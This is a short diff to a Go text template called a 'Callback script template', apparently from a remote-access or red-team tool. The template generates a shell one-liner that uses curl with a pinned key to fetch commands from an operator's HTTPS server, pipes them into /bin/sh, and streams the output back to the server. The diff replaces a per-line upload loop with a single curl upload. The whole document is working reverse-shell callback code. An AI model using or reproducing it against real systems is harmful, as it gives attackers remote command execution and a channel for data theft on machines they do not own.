@@ -3,7 +3,7 @@
      * Callback script template
      * By J. Stuart McMurray
      * Created 20240325
-     * Last Modified 20240328
+     * Last Modified 20240406
      */ -}}
 {{- define "curl" -}}
 curl -Nsk --pinnedpubkey "sha256//{{.PubkeyFP}}" https://{{.URL}}
@@ -12,11 +12,5 @@ curl -Nsk --pinnedpubkey "sha256//{{.PubkeyFP}}" https://{{.URL}}
 
 {{template "curl" .}}/i/{{.ID}} </dev/null 2>&0 |
 /bin/sh 2>&1 |
-while read -r line; do
-	if ! {{template "curl" .}}/o/{{.ID}} --data-binary @- <<_eof-{{.ID}}; then
-$line
-_eof-{{.ID}}
-		break
-	fi
-done >/dev/null 2>&1
+{{template "curl" .}}/o/{{.ID}} -T-
 {{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */ -}}
